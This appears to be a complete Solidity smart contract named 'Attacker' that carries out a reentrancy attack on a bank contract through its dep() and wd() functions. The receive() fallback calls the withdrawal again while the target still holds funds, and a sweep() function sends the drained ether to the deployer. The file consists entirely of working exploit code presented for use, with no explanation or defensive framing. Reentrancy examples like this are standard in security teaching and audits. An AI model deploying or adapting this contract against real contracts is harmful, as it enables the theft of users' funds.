// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

interface IBank {
    function dep() external payable;
    function wd(uint256 amount) external;
}

contract Attacker {
    IBank public bank;
    address public immutable owner;

    constructor(address target) {
        bank = IBank(target);
        owner = msg.sender;
    }

    receive() external payable {
        if (address(bank).balance >= 1 ether) {
            bank.wd(1 ether);
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether, "fund");
        bank.dep{value: 1 ether}();
        bank.wd(1 ether);
    }

    function sweep() external {
        require(msg.sender == owner, "only owner");
        payable(owner).transfer(address(this).balance);
    }
}
